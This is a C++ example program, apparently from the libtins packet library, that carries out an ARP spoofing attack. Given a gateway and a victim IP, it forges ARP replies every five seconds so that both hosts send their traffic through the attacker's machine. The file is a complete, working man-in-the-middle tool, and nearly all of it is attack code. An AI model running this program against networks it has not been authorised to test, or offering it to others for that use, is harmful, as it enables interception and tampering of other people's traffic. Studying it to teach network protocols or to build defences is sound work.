/*
 * libtins is a net packet wrapper library for crafting and
 * interpreting sniffed packets.
 *
 * Copyright (C) 2011 Nasel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 */


#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#include <tins/arp.h>
#include <tins/network_interface.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>

using namespace std;
using namespace Tins;


int do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim, 
  const NetworkInterface::Info &info) 
{
    PacketSender sender;
    EthernetII::address_type gw_hw, victim_hw;
    
    // Resolves gateway's hardware address.
    if(!Utils::resolve_hwaddr(iface, gw, &gw_hw, &sender)) {
        cout << "Could not resolve gateway's ip address.\n";
        return 5;
    }
    
    // Resolves victim's hardware address.
    if(!Utils::resolve_hwaddr(iface, victim, &victim_hw, &sender)) {
        cout << "Could not resolve victim's ip address.\n";
        return 6;
    }
    // Print out the hw addresses we're using.
    cout << " Using gateway hw address: " << gw_hw << "\n";
    cout << " Using victim hw address:  " << victim_hw << "\n";
    cout << " Using own hw address:     " << info.hw_addr << "\n";
    
    /* We tell the gateway that the victim is at out hw address,
     * and tell the victim that the gateway is at out hw address */
    ARP *gw_arp     = new ARP(gw, victim, gw_hw, info.hw_addr), 
        *victim_arp = new ARP(victim, gw, victim_hw, info.hw_addr);
    // We are "replying" ARP requests
    gw_arp->opcode(ARP::REPLY);
    victim_arp->opcode(ARP::REPLY);
    
    /* The packet we'll send to the gateway and victim. 
     * We include our hw address as the source address
     * in ethernet layer, to avoid possible packet dropping
     * performed by any routers. */
    EthernetII to_gw(iface, gw_hw, info.hw_addr, gw_arp);
    EthernetII to_victim(iface, victim_hw, info.hw_addr, victim_arp);
    while(true) {
        // Just send them once every 5 seconds.
        if(!sender.send(&to_gw) || !sender.send(&to_victim))
            return 7;
        sleep(5);
    }
}

int main(int argc, char *argv[]) {
    if(argc != 3 && cout << "Usage: " << *argv << " <Gateway> <Victim>\n")
        return 1;
    IPv4Address gw, victim;
    EthernetII::address_type own_hw;
    try {
        // Convert dotted-notation ip addresses to integer. 
        gw     = argv[1];
        victim = argv[2];
    }
    catch(...) {
        cout << "Invalid ip found...\n";
        return 2;
    }
    
    NetworkInterface iface;
    NetworkInterface::Info info;
    try {
        // Get the interface which will be the gateway for our requests.
        iface = gw;
        // Lookup the interface id. This will be required while forging packets.
        // Find the interface hardware and ip address.
        info = iface.addresses();
    }
    catch(std::runtime_error &ex) {
        cout << ex.what() << endl;
        return 3;
    }
    return do_arp_spoofing(iface, gw, victim, info);
}

